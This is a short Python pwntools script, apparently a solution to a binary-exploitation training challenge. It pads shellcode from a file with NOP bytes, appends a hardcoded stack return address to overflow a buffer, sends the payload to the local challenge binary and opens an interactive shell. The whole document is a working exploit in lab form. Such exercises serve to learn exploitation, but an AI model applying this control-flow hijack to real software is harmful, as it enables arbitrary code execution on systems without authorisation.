from pwn import *

shell_adress = 0x7fffffffcd60
ofsset = 0x60 + 8
f = open('shellcode-raw','rb') 
shell = f.read()
# print(shell)
shell = shell.ljust(ofsset, b'\x90')
payload =  shell +  p64(shell_adress)

print(str(len(shell)))
r = process('/challenge/binary-exploitation-hijack-to-shellcode-w')
print(r.recv(timeout=2).decode())
r.send(payload)
# print(r.recv(timeout=2).decode())
# r.send(b'\n')
r.interactive()
